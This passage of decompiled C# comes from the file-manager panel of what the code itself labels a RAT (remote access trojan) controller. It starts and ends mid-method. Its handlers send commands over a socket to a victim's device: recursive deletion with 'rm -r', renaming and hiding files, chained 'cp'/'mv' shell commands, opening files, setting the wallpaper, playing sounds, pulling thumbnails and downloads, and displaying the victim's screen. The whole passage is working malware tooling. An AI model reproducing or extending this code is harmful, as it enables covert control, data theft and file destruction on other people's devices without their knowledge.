					string text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
					if (Operators.CompareString(text, "0", false) == 0)
					{
						text2 = "del1";
						string text4 = text3;
						text3 = "rm -r" + Strings.Space(1) + this.Format_Space(text4);
					}
					if (this.classClient != null)
					{
						object[] array = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".files",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.resultClient,
								Data.SPL_SOCKET,
								text2,
								Data.SPL_DATA,
								text3
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(array);
						if (Operators.CompareString(text, "back", false) != 0)
						{
							this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[i].Index);
						}
					}
				}
			}
		}

		// Token: 0x06000604 RID: 1540 RVA: 0x00092B04 File Offset: 0x00090D04
		private void EditToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
					string text2 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(text2, "1", false) == 0)
					{
						object objectValue = RuntimeHelpers.GetObjectValue(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Tag);
						if (!Operators.ConditionalCompareObjectLessEqual(objectValue, 512000, false))
						{
							Interaction.MsgBox(string.Format(this.FSize, RuntimeHelpers.GetObjectValue(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value), RuntimeHelpers.GetObjectValue(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value)), MsgBoxStyle.Critical, reso.nameRAT);
						}
						else if (this.classClient != null)
						{
							object[] array = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.editor,
									Data.SPL_SOCKET,
									"edit",
									Data.SPL_DATA,
									text
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array);
						}
					}
				}
			}
		}

		// Token: 0x06000605 RID: 1541 RVA: 0x00092D88 File Offset: 0x00090F88
		private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.classClient == null)
			{
				return;
			}
			inp inp = new inp();
			inp.Text = "Zip";
			inp.LTitle.Text = "File Name";
			inp.InputText.Text = "new file.zip";
			inp.StartPosition = FormStartPosition.Manual;
			inp.Location = Codes.FixSize(this, inp);
			StringBuilder stringBuilder = new StringBuilder();
			DialogResult dialogResult = inp.ShowDialog(this);
			checked
			{
				if (dialogResult == DialogResult.OK && this.classClient != null && this.DGV0.SelectedRows.Count > 0)
				{
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), inp.InputText.Text));
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string text2 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						if (Operators.CompareString(text2, "1", false) == 0)
						{
							string text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
							stringBuilder.Append(text3 + Data.SPL_LINE);
						}
					}
					if (stringBuilder.ToString().Length > 0)
					{
						object[] array = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".files",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.resultClient,
								Data.SPL_SOCKET,
								"zip",
								Data.SPL_DATA,
								stringBuilder.ToString(),
								Data.SPL_DATA,
								text
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(array);
					}
				}
				inp.Close();
			}
		}

		// Token: 0x06000606 RID: 1542 RVA: 0x00092FF8 File Offset: 0x000911F8
		private void UnZipToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(text, "1", false) == 0)
					{
						string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
						string text3 = Conversions.ToString(Operators.ConcatenateObject(this.DGV0.Tag, "/"));
						if (this.classClient != null)
						{
							object[] array = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"unzip",
									Data.SPL_DATA,
									text2,
									Data.SPL_DATA,
									text3
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array);
						}
					}
				}
			}
		}

		// Token: 0x06000607 RID: 1543 RVA: 0x000931C0 File Offset: 0x000913C0
		private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.classClient == null || this.DGV0.SelectedRows.Count != 1)
			{
				return;
			}
			inp inp = new inp();
			inp.Text = "Rename";
			inp.LTitle.Text = "new Name";
			inp.StartPosition = FormStartPosition.Manual;
			inp.Location = Codes.FixSize(this, inp);
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					inp.InputText.Text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
				}
				DialogResult dialogResult = inp.ShowDialog(this);
				if (dialogResult == DialogResult.OK && this.classClient != null && this.DGV0.SelectedRows.Count == 1)
				{
					int num2 = this.DGV0.SelectedRows.Count - 1;
					for (int j = num2; j >= 0; j += -1)
					{
						string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[j].Index].Cells[1].Value));
						string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), inp.InputText.Text));
						if (Operators.CompareString(text, text2, false) != 0)
						{
							object[] array = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"rename",
									Data.SPL_DATA,
									text,
									Data.SPL_DATA,
									text2
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array);
						}
					}
				}
				inp.Close();
			}
		}

		// Token: 0x06000608 RID: 1544 RVA: 0x00093430 File Offset: 0x00091630
		private void HideToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", false))))
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
						if (text.Trim()[0] != '.')
						{
							string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/."), text));
							string text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), text));
							if (this.classClient != null)
							{
								object[] array = new object[]
								{
									this.Client,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".files",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.resultClient,
										Data.SPL_SOCKET,
										"rename",
										Data.SPL_DATA,
										text3,
										Data.SPL_DATA,
										text2
									}),
									Codes.Encoding().GetBytes("null"),
									this.classClient
								};
								this.classClient.SendMessage(array);
							}
						}
					}
				}
			}
		}

		// Token: 0x06000609 RID: 1545 RVA: 0x0009361C File Offset: 0x0009181C
		private void ShowToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				bool flag = false;
				for (int i = num; i >= 0; i += -1)
				{
					if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", false))))
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
						if (text.Trim()[0] == '.')
						{
							string text2 = null;
							int num2 = text.Length - 1;
							for (int j = 0; j <= num2; j++)
							{
								if (text.Trim()[j] != '.')
								{
									text2 += Conversions.ToString(text.Trim()[j]);
									flag = true;
								}
								else if (flag)
								{
									text2 += Conversions.ToString(text.Trim()[j]);
								}
							}
							flag = false;
							string text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), text2));
							string text4 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), text));
							if (this.classClient != null)
							{
								object[] array = new object[]
								{
									this.Client,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".files",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.resultClient,
										Data.SPL_SOCKET,
										"rename",
										Data.SPL_DATA,
										text4,
										Data.SPL_DATA,
										text3
									}),
									Codes.Encoding().GetBytes("null"),
									this.classClient
								};
								this.classClient.SendMessage(array);
							}
						}
					}
				}
			}
		}

		// Token: 0x0600060A RID: 1546 RVA: 0x00093878 File Offset: 0x00091A78
		private void AddFilesToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.classClient == null)
			{
				return;
			}
			inp inp = new inp();
			inp.Text = "Add Files";
			inp.LTitle.Text = "New name";
			inp.StartPosition = FormStartPosition.Manual;
			inp.Location = Codes.FixSize(this, inp);
			inp.BOXX.Visible = true;
			DialogResult dialogResult = inp.ShowDialog(this);
			if (dialogResult == DialogResult.OK && this.classClient != null)
			{
				bool @checked = inp.CheckFolder.Checked;
				bool checked2 = inp.CheckHidden.Checked;
				string text = inp.InputText.Text;
				if (checked2)
				{
					text = "." + text;
				}
				string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), text));
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.resultClient,
						Data.SPL_SOCKET,
						"create",
						Data.SPL_DATA,
						text2,
						Data.SPL_DATA,
						Conversions.ToString(@checked)
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
			inp.Close();
		}

		// Token: 0x0600060B RID: 1547 RVA: 0x00093A04 File Offset: 0x00091C04
		private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(text, "1", false) == 0)
					{
						string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
						if (this.classClient != null)
						{
							string text3 = "null";
							if (text2.Contains(".") & !text2.EndsWith("."))
							{
								text3 = text2.Substring(text2.LastIndexOf(".") + 1);
							}
							object[] array = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"open",
									Data.SPL_DATA,
									text2,
									Data.SPL_DATA,
									text3
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array);
						}
					}
				}
			}
		}

		// Token: 0x0600060C RID: 1548 RVA: 0x00093BE8 File Offset: 0x00091DE8
		private bool ISupportedText(string t)
		{
			if (t.Contains("."))
			{
				string text = "\"" + t.Substring(t.LastIndexOf(".")) + "\"";
				return reso.SupportedText.Contains(text);
			}
			return false;
		}

		// Token: 0x0600060D RID: 1549 RVA: 0x00093C38 File Offset: 0x00091E38
		private bool ISupportedImages(string t)
		{
			if (t.Contains("."))
			{
				string text = "\"" + t.Substring(t.LastIndexOf(".")) + "\"";
				return reso.SupportedImages.Contains(text);
			}
			return false;
		}

		// Token: 0x0600060E RID: 1550 RVA: 0x00093C88 File Offset: 0x00091E88
		private bool ISupportedVideo(string t)
		{
			if (t.Contains("."))
			{
				string text = "\"" + t.Substring(t.LastIndexOf(".")) + "\"";
				return reso.SupportedVideo.Contains(text);
			}
			return false;
		}

		// Token: 0x0600060F RID: 1551 RVA: 0x00003D19 File Offset: 0x00001F19
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x06000610 RID: 1552 RVA: 0x00093CD8 File Offset: 0x00091ED8
		private void DGV0_SelectionChanged(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					if (this.DGV0.SelectedRows.Count == 1)
					{
						int num = this.DGV0.SelectedRows.Count - 1;
						for (int i = num; i >= 0; i += -1)
						{
							string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
							if (Operators.CompareString(text, "1", false) == 0)
							{
								string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
								bool flag = false;
								this.FileDirectory = Conversions.ToString(Operators.ConcatenateObject(this.classClient.FolderUSER + "\\Thumbs", NewLateBinding.LateGet(this.DGV0.Tag, null, "Replace", new object[] { "/", "\\" }, null, null, null)));
								if (text2.Substring(text2.LastIndexOf("/") + 1).EndsWith(".mp4"))
								{
									string text3 = text2.Substring(text2.LastIndexOf("/") + 1);
									if (this.thumb_chk.Checked && Directory.Exists(this.FileDirectory + "\\" + text3.Replace(".mp4", "")))
									{
										using (IEnumerator<string> enumerator = MyProject.Computer.FileSystem.GetFiles(this.FileDirectory + "\\" + text3.Replace(".mp4", "")).GetEnumerator())
										{
											if (enumerator.MoveNext())
											{
												string text4 = enumerator.Current;
												FileInfo fileInfo = MyProject.Computer.FileSystem.GetFileInfo(text4);
												this.viwimage.Image = Codes.ReadBitmapFromFile(string.Concat(new string[]
												{
													this.FileDirectory,
													"\\",
													text3.Replace(".mp4", ""),
													"\\",
													fileInfo.Name
												}));
												this.viwimage.Visible = true;
												flag = true;
											}
										}
									}
								}
								if (flag)
								{
									break;
								}
								if (this.thumb_chk.Checked && Directory.Exists(this.FileDirectory) && File.Exists(this.FileDirectory + "\\" + text2.Substring(text2.LastIndexOf("/") + 1)))
								{
									try
									{
										if (this.viwimage.Image != null)
										{
											this.viwimage.Image.Dispose();
											this.viwimage.Image = null;
										}
									}
									catch (Exception)
									{
									}
									this.viwimage.Image = Codes.ReadBitmapFromFile(this.FileDirectory + "\\" + text2.Substring(text2.LastIndexOf("/") + 1));
									this.viwimage.Visible = true;
									flag = true;
								}
								if (flag)
								{
									break;
								}
								string text5 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
								object obj = (this.ISupportedImages(text5.ToLower()) ? "false" : ((!this.ISupportedVideo(text5.ToLower())) ? "null" : "true"));
								if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", false))) && this.classClient != null)
								{
									string[] array = this.classClient.Keys.Split(new char[] { ':' });
									object[] array2 = new object[]
									{
										this.Client,
										Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
										{
											SecurityKey.KeysClient1,
											Data.SPL_SOCKET,
											reso.domen,
											".files",
											Data.SPL_SOCKET,
											"method",
											Data.SPL_SOCKET,
											SecurityKey.resultClient,
											Data.SPL_SOCKET,
											"small",
											Data.SPL_DATA,
											array[0],
											Data.SPL_DATA,
											array[1],
											Data.SPL_DATA,
											text2,
											Data.SPL_DATA
										}), obj), Data.SPL_DATA), this.Q), Data.SPL_DATA), SecurityKey.ImageViewer), "File" + this.classClient.UUID),
										Codes.Encoding().GetBytes("null"),
										this.classClient
									};
									this.classClient.SendMessage(array2);
								}
							}
							else
							{
								this.viwimage.Image = null;
							}
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000611 RID: 1553 RVA: 0x00094258 File Offset: 0x00092458
		private void Sub_Clipboard(string pram)
		{
			if ((Operators.CompareString(pram, "'PASTE'", false) == 0) & (this.Clipboard.Count > 0))
			{
				string text = this.Format_Space(Conversions.ToString(this.DGV0.Tag));
				string text2 = "";
				foreach (Array array in this.Clipboard)
				{
					Array array2 = array;
					text2 = ((text2.Length == 0) ? Conversions.ToString(Operators.ConcatenateObject(text2, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet(array2, new object[] { 3 }, null), Strings.Space(1)), NewLateBinding.LateIndexGet(array2, new object[] { 2 }, null)), Strings.Space(1)), text))) : Conversions.ToString(Operators.ConcatenateObject(text2, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Strings.Space(1) + "&&" + Strings.Space(1), NewLateBinding.LateIndexGet(array2, new object[] { 3 }, null)), Strings.Space(1)), NewLateBinding.LateIndexGet(array2, new object[] { 2 }, null)), Strings.Space(1)), text))));
				}
				object[] array3 = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.resultClient,
						Data.SPL_SOCKET,
						"commend",
						Data.SPL_DATA,
						text2
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array3);
				this.Clipboard.Clear();
				return;
			}
			this.Clipboard.Clear();
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text3 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(text3, "back", false) != 0)
					{
						string text4 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
						bool flag = Operators.CompareString(text3, "1", false) == 0;
						if (Operators.CompareString(pram, "'COPY'", false) == 0)
						{
							if (flag)
							{
								this.Clipboard.Add(new object[]
								{
									pram,
									flag,
									this.Format_Space(text4),
									"cp"
								});
							}
							else
							{
								this.Clipboard.Add(new object[]
								{
									pram,
									flag,
									this.Format_Space(text4),
									"cp -R"
								});
							}
						}
						else
						{
							this.Clipboard.Add(new object[]
							{
								pram,
								flag,
								this.Format_Space(text4),
								"mv"
							});
						}
					}
				}
			}
		}

		// Token: 0x06000612 RID: 1554 RVA: 0x00003D4F File Offset: 0x00001F4F
		private string Format_Space(string prm)
		{
			if (prm.Contains(Strings.Space(1)))
			{
				prm = prm.Replace(Strings.Space(1), "(U+0020)".ToLower());
			}
			return prm;
		}

		// Token: 0x06000613 RID: 1555 RVA: 0x00003D78 File Offset: 0x00001F78
		private void CutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.Sub_Clipboard("'CUT'");
		}

		// Token: 0x06000614 RID: 1556 RVA: 0x00003D85 File Offset: 0x00001F85
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.Sub_Clipboard("'COPY'");
		}

		// Token: 0x06000615 RID: 1557 RVA: 0x00003D92 File Offset: 0x00001F92
		private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.Clipboard.Count != 0)
			{
				this.Sub_Clipboard("'PASTE'");
			}
		}

		// Token: 0x06000616 RID: 1558 RVA: 0x00094630 File Offset: 0x00092830
		private void SetWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", false))))
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
						string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), text));
						if (this.classClient != null)
						{
							object[] array = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"set_wallpaper",
									Data.SPL_DATA,
									text2
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array);
						}
					}
				}
			}
		}

		// Token: 0x06000617 RID: 1559 RVA: 0x000947D8 File Offset: 0x000929D8
		private void PlaySoundToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", false))))
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
						string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), text));
						if (this.classClient != null)
						{
							object[] array = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"play_back",
									Data.SPL_DATA,
									text2
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array);
						}
					}
				}
			}
		}

		// Token: 0x06000618 RID: 1560 RVA: 0x00094980 File Offset: 0x00092B80
		private void ctxMenu_Opening(object sender, CancelEventArgs e)
		{
			string text = this.ver;
			if (Operators.CompareString(text, "v1.0", false) != 0)
			{
				this.SetWallpaperToolStripMenuItem.Visible = true;
				return;
			}
			this.SetWallpaperToolStripMenuItem.Visible = false;
		}

		// Token: 0x06000619 RID: 1561 RVA: 0x000949BC File Offset: 0x00092BBC
		private void FileManager_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (this.DGVDATA.Rows.Count > 0)
			{
				int num = 0;
				foreach (object obj in ((IEnumerable)this.DGVDATA.Rows))
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					if (dataGridViewRow.Tag.ToString().Length > 1 && Operators.CompareString(dataGridViewRow.Tag.ToString(), "x", false) != 0)
					{
						num = 1;
						break;
					}
				}
				if (num > 0)
				{
					try
					{
						if (!Codes.MyMsgBox("Downloads", "Some Downloads is Running :\r\nStop Active Downloads...?", true, Resources.warning48px))
						{
							e.Cancel = true;
							return;
						}
					}
					catch (Exception)
					{
					}
				}
			}
			this.Timer1.Stop();
			this.Timer2.Stop();
			this.Correntindex = 1;
			checked
			{
				int num2 = this.DownStreams.Count - 1;
				for (int i = 0; i <= num2; i++)
				{
					try
					{
						if (this.DownStreams[i] != null)
						{
							object objectValue = RuntimeHelpers.GetObjectValue(this.DownStreams[i]);
							FileStream fileStream = (FileStream)NewLateBinding.LateIndexGet(objectValue, new object[] { 0 }, null);
							if (fileStream != null)
							{
								fileStream.Dispose();
								fileStream.Close();
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x0600061A RID: 1562 RVA: 0x00094B34 File Offset: 0x00092D34
		private void Pathtxt_SizeChanged(object sender, EventArgs e)
		{
			try
			{
				this.PB.Size = this.pathtxt.Size;
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600061B RID: 1563 RVA: 0x00094B6C File Offset: 0x00092D6C
		private void LoadVideo()
		{
			if (this.DGV0.SelectedRows.Count != 1)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(text, "1", false) == 0)
					{
						string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
						this.FileDirectory = Conversions.ToString(Operators.ConcatenateObject(this.classClient.FolderUSER + "\\Thumbs", NewLateBinding.LateGet(this.DGV0.Tag, null, "Replace", new object[] { "/", "\\" }, null, null, null)));
						if (text2.Substring(text2.LastIndexOf("/") + 1).EndsWith(".mp4"))
						{
							this.ShowVideo = true;
							this.thumb_chk.Checked = false;
							this.thumb_chk.Refresh();
							string text3 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
							object obj = (this.ISupportedImages(text3.ToLower()) ? "false" : ((!this.ISupportedVideo(text3.ToLower())) ? "null" : "true"));
							if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", false))) && this.classClient != null)
							{
								string[] array = this.classClient.Keys.Split(new char[] { ':' });
								object[] array2 = new object[]
								{
									this.Client,
									Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".files",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.resultClient,
										Data.SPL_SOCKET,
										"small",
										Data.SPL_DATA,
										array[0],
										Data.SPL_DATA,
										array[1],
										Data.SPL_DATA,
										text2,
										Data.SPL_DATA
									}), obj), Data.SPL_DATA), this.Q), Data.SPL_DATA), SecurityKey.ImageViewer), "File" + this.classClient.UUID),
									Codes.Encoding().GetBytes("null"),
									this.classClient
								};
								this.classClient.SendMessage(array2);
							}
						}
					}
					else
					{
						this.viwimage.Image = null;
					}
				}
			}
		}

		// Token: 0x0600061C RID: 1564 RVA: 0x00003DAC File Offset: 0x00001FAC
		private void Viwimage_MouseLeave(object sender, EventArgs e)
		{
			this.ShowVideo = false;
			this.thumb_chk.Checked = true;
			this.thumb_chk.Refresh();
		}

		// Token: 0x0600061D RID: 1565 RVA: 0x00094ED0 File Offset: 0x000930D0
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (this.classClient.isconnected)
				{
					if (!this.classClient.isready)
					{
						return;
					}
					this.Text = string.Format("{0} - ID:{1}", "File Manager", this.classClient.UUID);
					this.ClientPic.Image = this.classClient.Wallpaper;
					this.usrscreen.Image = reso.GetScreen(this.classClient.Screen);
					try
					{
						DataGridViewRow row = this.classClient.Row;
						return;
					}
					catch (Exception)
					{
						return;
					}
				}
				this.ClientPic.Image = Resources.disconnected;
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600061E RID: 1566 RVA: 0x00002423 File Offset: 0x00000623
		private void ClearButton_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600061F RID: 1567 RVA: 0x00094F8C File Offset: 0x0009318C
		private void Button2_Click(object sender, EventArgs e)
		{
			if (this.DGVDATA.SelectedRows.Count <= 0)
			{
				return;
			}
			foreach (object obj in this.DGVDATA.SelectedRows)
			{
